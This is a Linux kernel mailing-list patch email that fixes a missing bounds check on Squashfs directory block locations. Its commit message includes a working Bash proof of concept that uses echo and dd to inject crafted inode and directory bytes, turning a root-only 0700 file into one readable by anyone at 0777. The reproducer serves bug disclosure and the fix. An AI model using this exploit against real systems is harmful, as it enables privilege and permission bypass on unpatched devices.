Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=188.121.53.35
ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
	t=1795405437;
	b=SZncjpco2Wn6064UkLyv/5YBZJpfhwUBQXNPKOjiAPhEqxEVn07PNw88Gzvt0qhGySdv
	 /kpXtnYDfba8HgjRcq9zansgf+5BpCPn2cu7JUmbXuFVs+xAn/x524ibt4Et9LbTgnMyu
	 bPZ10uWKBdFGq6n53VLAapeSeyMbp7tEQaDEnMt61pwGCxygITnAKVi43E7tzEo8YuiCq
	 v7wUXdyKlaOq6JTmr8KRuF0q0PuNpszfyK/tIu0triJlRAaETRgerv9TvvleBGCToguCb
	 CnZ1Do0UpB6JEowtT8YTE6ojawHH9v7LmKA8HZTEUCkUGn6yzt4v51nYjbYD7pXbggw==
ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
	a=rsa-sha256; c=relaxed/relaxed; t=1795405437;
	h=DMARC-Filter:Received:DKIM-Signature:DKIM-Signature:X-CMAE-Analysis:
	 Feedback-ID:X-SECURESERVER-ACCT:From:To:Cc:Subject:Date:Message-ID:
	 X-Mailer:In-Reply-To:References:MIME-Version:
	 Content-Transfer-Encoding:X-CMAE-Envelope;
	bh=nC2fy4hBeGVVv/wWDX3LZ1rJyLL2CzXFKPc+gtctTAY=;
	b=nizlkAOj67RfbQHklSWudFNZ3dbpE/d59WUmcAejs1QnBMZn35erCflqu7cuBUa7YWRK
	 uq0Eh7Ukbkll/GVY3Vtb4MFdZX1ZqJqZGjK5Bj33KiXXk145dpqON1RpPZeXFy1sqQMBp
	 7+wAGfKJzUC800JVXQcJ1aYAU5gAl74ETraVqSnS17PuB8RREHrr7lUvCnio2WhlDol9M
	 I27KloOpm5T6DM2A3yK5CE7vpMPNJ28HIg/qbwq/nw7d+9/fmhb2hHU6+m9b0aID/vsQc
	 65tZ9chLG6mN2P3vN6efRDAjOTnAmSEW4NhSGknEGmeQxkw5reXxCRz0d+D6xhLyrHg==
ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
	dmarc=pass header.from=squashfs.org.uk;
	spf=pass smtp.mailfrom=squashfs.org.uk;
	dkim=pass header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=tjKStR+H;
	dkim=pass header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b="cDN/8MZ0";
	arc=none smtp.remote-ip=188.121.53.35
Received: from sxplsmtpa04-04.prod.sxb1.secureserver.net (sxplsmtpa04-04.prod.sxb1.secureserver.net [188.121.53.35])
	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 809FA60A2609
	for <linux-kernel@vger.kernel.org>; Mon, 23 Nov 2026 03:43:56 +0000 (UTC)
DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 809FA60A2609
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=squashfs.org.uk
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key, unprotected) header.d=secureserver.net header.i=@secureserver.net header.a=rsa-sha256 header.s=secureserver2 header.b=tjKStR+H;
	dkim=pass (2048-bit key, unprotected) header.d=squashfs.org.uk header.i=@squashfs.org.uk header.a=rsa-sha256 header.s=secureserver1 header.b=cDN/8MZ0
Received: from avalon.fritz.box ([82.69.79.175])
	by :SMTPAUTH: with ESMTPA
	id VKxRxJoOeZuU3VKxxxiqR7; Mon, 23 Nov 2026 03:43:42 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=secureserver.net;
	s=secureserver2; t=1795405423;
	bh=nC2fy4hBeGVVv/wWDX3LZ1rJyLL2CzXFKPc+gtctTAY=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=tjKStR+Hqz08jbsnLxJktgp7TYbp+9azZits7z9ofJr71HW1QiaNWeIEhC6/YXsDc
	 kYwe7LUG9inIvgLayK/cVNIsJhLrmjvDOG/NXkgMiKnxyy7kfGr5zeWbTeJv8XKFvW
	 U2liWxxBr2fyWLcS501XFfuJHCs1sdSdCvFYCKzdgN85PF8HavrghBX8oqDFpB7mns
	 QSDUC5Lk0/MbHPcALA+n9tQ4e5oM6203ZJb4n1CPiwi4NaXz3GU5cBikC4PaJhg0/5
	 /WLWq2Bnh4JTOM/pIRWJRL7G1i2icfS9c+fL7ZV5dBwtqKlauo1nciqVYSMl3hmPvW
	 D1u1h24kG2+Gw==
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=squashfs.org.uk;
	s=secureserver1; t=1795405423;
	bh=nC2fy4hBeGVVv/wWDX3LZ1rJyLL2CzXFKPc+gtctTAY=;
	h=From:To:Cc:Subject:Date:In-Reply-To:References;
	b=cDN/8MZ00jEqBB12Ih4me0xIs3vU76i+BldNRXS8WJWvbJAgUD7XKxBwH0b1gDOGe
	 mKe/DLTHp8NDmJG6NWqPx1Jgd4ujUDlnTz47ekkO757dOqspscGorGF33HVbbOVE1U
	 iAPF7jiWAiRTOB/NxrD6+wR3u7vBfTdCEJX6xXAR8voFxbjAnMKfJFxg7IM/P0fOdR
	 YINc2HPnCgn6M8j4gztPlzEu05qgWnfQsParQxhsWQzAtG6zZ5S8lsf0qS7t8GM5n0
	 aZgkNs7GClBLKvJd0i2GvkAIDXcY+Ev7KxZxGd5O64m8xEdaD+TCCSjHK5I7oj5Rg0
	 Eita/LBxgM0gg==
X-CMAE-Analysis: v=2.4 cv=CvYq4X4D c=1 sm=1 tr=0 ts=6b03b66e
 a=84ok6UeoqCVsigPHarzEiQ==:117 a=84ok6UeoqCVsigPHarzEiQ==:17 a=FXvPX3liAAAA:8
 a=gec7vXQWKUr_qcHTS5AA:9 a=UObqyxdv-6Yh2QiB9mM_:22
Feedback-ID: f9bb0281d4c83dab87e454446ba354b5:squashfs.org.uk:ssnet
X-SECURESERVER-ACCT: phillip@squashfs.org.uk
From: Phillip Lougher <phillip@squashfs.org.uk>
To: akpm@linux-foundation.org,
	linux-kernel@vger.kernel.org
Cc: Phillip Lougher <phillip@squashfs.org.uk>
Subject: [PATCH v3 12/23] Squashfs: sanity check directory metadata block location
Date: Mon, 23 Nov 2026 03:42:53 +0000
Message-ID: <20261123034304.261742-13-phillip@squashfs.org.uk>
X-Mailer: git-send-email 2.47.3
In-Reply-To: <20261123034304.261742-1-phillip@squashfs.org.uk>
References: <20261123034304.261742-1-phillip@squashfs.org.uk>
X-Mailing-List: linux-kernel@vger.kernel.org
List-Id: <linux-kernel.vger.kernel.org>
List-Post: <mailto:linux-kernel@vger.kernel.org>
List-Help: <mailto:linux-kernel+help@vger.kernel.org>
List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
Precedence: list
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit
X-CMAE-Envelope: MS4xfLUj0sKuRJNt/eblwMQl3b/qs/w4VmuhhT2JnrfLCNrqrrHy+G/posNnzDi2NC1CQiVkWDAWRkfFc20Wa4Xn06EE5wK12EDLM3/8bk6PpMAIJUSgLf9/
 Pmjfx/TCd0o1JH82FWz/KI/inZVve7yLtrYlRF3fSEZNgU8SvYoNXdeZoN0XYiwZotc4KzObIQBNx9SA1v23ANY6R/4J5IwURkj6SzoHrb+xYIhyb30F1LHU
 FmrsGliwWu4wDoa3tpN7HfZ6lP+JIpjKrv/ERkmzaEfMKJlf0T4MwefaAeMPVcPI

The contents of directories are stored in compressed metadata blocks,
which are placed in the directory table.  The location of a directory
is thus represented as a tuple, the location of the compressed metadata
block that the directory is in, and the offset into the uncompressed
block.  The block location is not absolute, and it is instead encoded
as an offset from the start of the directory table.

An attacker could manipulate the directory block location to make it
point to a replacement malicious directory stored elsewhere, outside
the directory table.  This is because the code does not check that the
location is valid and is within the directory table.

In practice this exploit is hard to achieve because metadata in Squashfs
is compressed by default, and so the compressed metadata cannot be
directly altered.  In addition due to sanity checking at mount time
there are no gaps in the filesystem to store a malicious directory.

Also anyone with access to Mksquashfs/Unsquashfs can copy and recreate
the filesystem incorporating whatever changes they want.

However, there are a number of exploit scenarios here.  Many embedded
systems or secure systems have deliverately restricted installations
with only basic tools, and lack any Mksquashfs/Unsquashfs.  But exploits
due to this bug can be achieved with only echo and dd.

An example exploit is where a Squashfs filesystem has a file in the
root directory with permissions 0700 (u=rxw), where only the superuser
can read it.  But using this bug an attacker could create a malicious
replacement directory in the inode lookup table (used by NFS), that
points to a malicious replacement inode that has the permissions
changed to 0777 (a=wrx).  On reboot/remount this would make the
file readable by unprivileged users.

The following shell script acts as a reproducer and proof of concept.

This commit blocks such attempts by adding a new helper
squashfs_dir_start() which adds additional sanity checking, first
ensuring no arithmetic operations overflow, and second checking that
the directory is within the directory table.

Reproducer
==========

The following Bash script uses echo and dd to achieve the previously
discussed exploit.  If the exploit is successful the file "data"
permissions will be changed to 0777 (a=rwx), but otherwise the
filesystem is unchanged.

===================================================================
#!/bin/bash

ARGS="-no-sparse -no-hardlinks -no-progress -quiet -inode-time 0 -mkfs-time 0"

finish() {
	popd 2>&1 > /dev/null
	rm -rf $DIR
	exit 1
}

DIR=$(mktemp -d)

pushd $DIR 2>&1 > /dev/null

# Create a Squashfs pseudo file which is fed to Mksquashfs
echo Create a Squashfs pseudo file which is fed to Mksquashfs

dd if=/dev/zero of=zero bs=1024 count=1 status=none
echo "data f 0700 0 0 echo some data" >> pseudo
echo "files d 0777 0 0" >> pseudo
for i in $(seq 1 100); do
	echo "files/$i f 0655 1000 1000 cat zero" >> pseudo
done

# Create a Squashfs filesystem
echo "Create a Squashfs filesystem"

if ! mksquashfs - img.sqsh -pf pseudo -p "/ d 0777 0 0" $ARGS; then
	echo Failed to create Squashfs filesystem
	finish
fi

# Exploit: The file named "data" has permissions 0700, which can only be
# read by the superuser.  The desire is to change the permissions on
# the file to be 0777, which can be read by unprivileged users.
#
# Due to compression of the metadata, this cannot be done by directly
# writing to the metadata tables.  Instead the real metadata is replaced
# by malicious metadata starting from the "data" file inode upwards to
# the root inode.
#
# This is a three step process.
#
# 1. A new "data" file inode is placed within the inode lookup table
# 2. A new root directory which points to the new "data" file inode is
#    placed in the inode lookup table
# 3. A new root inode which pounts to the new root directory table is
#    placed in the inode lookup table.
#
# For brevity this reproducer uses pre-computed data for the above.

# Write malicious inode for file "data", this is the same as the
# original except it is uncompressed, and the permissions are set to
# 0777.
echo Writing malicious inode for file \"data\"

/usr/bin/echo -en "\x20\x80\x02\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
\x00\x0A\x00\x00\x00" > file

dd bs=1 seek=1034 if=file of=img.sqsh count=34 conv=notrunc status=none

# Write directory data which points to the malicious inode
echo Writing root directory which points to malicious inode

/usr/bin/echo -en "\x31\x80\x00\x00\x00\x00\x90\x03\x00\x00\x01\x00\x00\
\x00\x00\x00\x00\x00\x02\x00\x03\x00\x64\x61\x74\x61\x00\x00\x00\x00\
\x00\x00\x00\x00\x02\x00\x00\x00\xA0\x0C\x00\x00\x01\x00\x04\x00\x66\
\x69\x6c\x65\x73" > file

dd bs=1 seek=983 if=file of=img.sqsh count=51 conv=notrunc status=none

#
# Write root inode, this is the same as the original root inode, except
# it is uncompressed, and it points to the new directory data
echo Writing root inode which points to the new root directory

/usr/bin/echo -en "\x20\x80\x01\x00\xFF\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x67\x00\x00\x00\x43\x02\x00\x00\x03\x00\x00\x00\x34\x00\x00\
\x00\x00\x00\x00\x00" > file

dd bs=1 seek=949 if=file of=img.sqsh count=34 conv=notrunc status=none

# Update the root_inode field in the superblock to point to our new
# root inode.  The start block is an offset from the inode_table_start,
# and not an absolute value.  The start of the inode table is 122, the
# new inode is placed at position 949, and so the offset is 827. Because
# we've only stored one inode in the metadata block, the offset into
# that block is 0.
echo Updating the root_inode field in the superblock

/usr/bin/echo -en "\x00\x00\x3B\x03" > file

dd bs=1 seek=32 if=file of=img.sqsh count=4 conv=notrunc status=none

# Mount the filesystem to /mnt
echo Mount the filesystem to /mnt

if ! mount -t squashfs img.sqsh /mnt; then
	echo Mount of Squashfs filesystem failed
	finish
fi

# Stat /mnt/data, if the exploit is successful, permissions should be 0777
echo "************************************************************************"
echo Stat /mnt/data, if the exploit is successful, permissions should be 0777

stat /mnt/data

popd 2>&1> /dev/null

rm -rf $DIR
=====================================================================

Fixes: c88da2c979369 ("Squashfs: directory lookup operations")
Signed-off-by: Phillip Lougher <phillip@squashfs.org.uk>
---
v3:
 - Change definition of start from u64 to s64 in squashfs_lookup().
 - Remove v2 check to ensure empty filesystems do not trigger new sanity
   checks.  This is now dealt with in patch 8.
v2:
 - Ensure dire is not used uninitialised.
 - Ensure empty filesystems do not trigger new sanity checks.
---
 fs/squashfs/dir.c              | 19 +++++++++++++------
 fs/squashfs/namei.c            | 16 +++++++++++-----
 fs/squashfs/squashfs_fs_sb.h   |  1 +
 fs/squashfs/squashfs_helpers.h | 16 ++++++++++++++++
 fs/squashfs/super.c            |  1 +
 5 files changed, 42 insertions(+), 11 deletions(-)

diff --git a/fs/squashfs/dir.c b/fs/squashfs/dir.c
index 7bbdfa438a32..e961af7490dc 100644
--- a/fs/squashfs/dir.c
+++ b/fs/squashfs/dir.c
@@ -22,6 +22,7 @@
 #include "squashfs_fs.h"
 #include "squashfs_fs_sb.h"
 #include "squashfs_fs_i.h"
+#include "squashfs_helpers.h"
 #include "squashfs.h"
 
 static const unsigned char squashfs_filetype_table[] = {
@@ -41,6 +42,7 @@ static int get_dir_index_using_offset(struct super_block *sb,
 	int i_count, u64 f_pos)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 res;
 	int err, i, index, length = 0;
 	unsigned int size;
 	struct squashfs_dir_index dir_index;
@@ -81,9 +83,12 @@ static int get_dir_index_using_offset(struct super_block *sb,
 		if (err < 0)
 			break;
 
+		res = squashfs_dir_start(le32_to_cpu(dir_index.start_block), msblk);
+		if (res < 0)
+			break;
+
 		length = index;
-		*next_block = le32_to_cpu(dir_index.start_block) +
-					msblk->directory_table;
+		*next_block = res;
 	}
 
 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
@@ -99,11 +104,11 @@ static int squashfs_readdir(struct file *file, struct dir_context *ctx)
 {
 	struct inode *inode = file_inode(file);
 	struct squashfs_sb_info *msblk = inode->i_sb->s_fs_info;
-	u64 block;
+	s64 block;
 	int offset, length, err;
 	unsigned int inode_number, dir_count, size, type;
 	struct squashfs_dir_header dirh;
-	struct squashfs_dir_entry *dire;
+	struct squashfs_dir_entry *dire = NULL;
 
 	TRACE("Entered squashfs_readdir [%llx:%x]\n", squashfs_i(inode)->start,
 			squashfs_i(inode)->offset);
@@ -141,15 +146,17 @@ static int squashfs_readdir(struct file *file, struct dir_context *ctx)
 		/* The directory is empty, nothing more to do */
 		goto finish;
 
+	block = squashfs_dir_start(squashfs_i(inode)->start, msblk);
+	if (block < 0)
+		goto failed_read;
+
 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
 	if (dire == NULL) {
 		ERROR("Failed to allocate squashfs_dir_entry\n");
 		goto finish;
 	}
 
-	block = squashfs_i(inode)->start + msblk->directory_table;
 	offset = squashfs_i(inode)->offset;
-
 	length = get_dir_index_using_offset(inode->i_sb, &block, &offset,
 				squashfs_i(inode)->dir_idx_start,
 				squashfs_i(inode)->dir_idx_offset,
diff --git a/fs/squashfs/namei.c b/fs/squashfs/namei.c
index c8009e0b2edd..40114813f51f 100644
--- a/fs/squashfs/namei.c
+++ b/fs/squashfs/namei.c
@@ -66,6 +66,7 @@ static int get_dir_index_using_name(struct super_block *sb,
 			int index_offset, int i_count, const char *name)
 {
 	struct squashfs_sb_info *msblk = sb->s_fs_info;
+	s64 res;
 	int i, length = 0, err;
 	unsigned int size;
 	struct squashfs_dir_index *index;
@@ -102,9 +103,12 @@ static int get_dir_index_using_name(struct super_block *sb,
 		if (strcmp(index->name, name) > 0)
 			break;
 
+		res = squashfs_dir_start(le32_to_cpu(index->start_block), msblk);
+		if (res < 0)
+			break;
+
 		length = le32_to_cpu(index->index);
-		*next_block = le32_to_cpu(index->start_block) +
-					msblk->directory_table;
+		*next_block = res;
 	}
 
 	*next_offset = (length + *next_offset) % SQUASHFS_METADATA_SIZE;
@@ -130,7 +134,7 @@ static struct dentry *squashfs_lookup(struct inode *dir, struct dentry *dentry,
 	struct squashfs_sb_info *msblk = dir->i_sb->s_fs_info;
 	struct squashfs_dir_header dirh;
 	struct squashfs_dir_entry *dire = NULL;
-	u64 block;
+	s64 block;
 	int offset, err, length;
 	unsigned int dir_count, size;
 
@@ -144,15 +148,17 @@ static struct dentry *squashfs_lookup(struct inode *dir, struct dentry *dentry,
 		/* The directory is empty, and so there's nothing to do */
 		goto exit_lookup;
 
+	block = squashfs_dir_start(squashfs_i(dir)->start, msblk);
+	if (block < 0)
+		goto data_error;
+
 	dire = kmalloc(sizeof(*dire) + SQUASHFS_NAME_LEN + 1, GFP_KERNEL);
 	if (dire == NULL) {
 		ERROR("Failed to allocate squashfs_dir_entry\n");
 		return ERR_PTR(-ENOMEM);
 	}
 
-	block = squashfs_i(dir)->start + msblk->directory_table;
 	offset = squashfs_i(dir)->offset;
-
 	length = get_dir_index_using_name(dir->i_sb, &block, &offset,
 				squashfs_i(dir)->dir_idx_start,
 				squashfs_i(dir)->dir_idx_offset,
diff --git a/fs/squashfs/squashfs_fs_sb.h b/fs/squashfs/squashfs_fs_sb.h
index b87221ea9bdd..949dab87a241 100644
--- a/fs/squashfs/squashfs_fs_sb.h
+++ b/fs/squashfs/squashfs_fs_sb.h
@@ -67,6 +67,7 @@ struct squashfs_sb_info {
 	__le64					*inode_lookup_table;
 	u64					inode_table;
 	u64					directory_table;
+	u64					directory_table_end;
 	u64					xattr_table;
 	unsigned int				block_size;
 	unsigned short				block_log;
diff --git a/fs/squashfs/squashfs_helpers.h b/fs/squashfs/squashfs_helpers.h
index 662ebf464d3c..124ee18ed8c9 100644
--- a/fs/squashfs/squashfs_helpers.h
+++ b/fs/squashfs/squashfs_helpers.h
@@ -70,6 +70,22 @@ static inline s64 squashfs_mkinode(u32 start, u16 offset)
 	return ((s64)start << 16) | offset;
 }
 
+/* directory helper functions */
+static inline s64 squashfs_dir_start(u32 blk, struct squashfs_sb_info *msblk)
+{
+	s64 start;
+
+	if (S64_MAX - msblk->directory_table < blk)
+		return -EINVAL;
+
+	start = msblk->directory_table + blk;
+
+	if (start >= msblk->directory_table_end)
+		return -EINVAL;
+
+	return start;
+}
+
 /* fragment and fragment table defines */
 static inline s64 squashfs_fragment_bytes(u32 fragments)
 {
diff --git a/fs/squashfs/super.c b/fs/squashfs/super.c
index 0e511dd29d58..8c42f1eb375b 100644
--- a/fs/squashfs/super.c
+++ b/fs/squashfs/super.c
@@ -437,6 +437,7 @@ static int squashfs_fill_super(struct super_block *sb, struct fs_context *fc)
 		err = -EINVAL;
 		goto insanity;
 	}
+	msblk->directory_table_end = next_table;
 
 	/* Sanity check inode_table */
 	if (msblk->inode_table >= msblk->directory_table) {
-- 
2.47.3

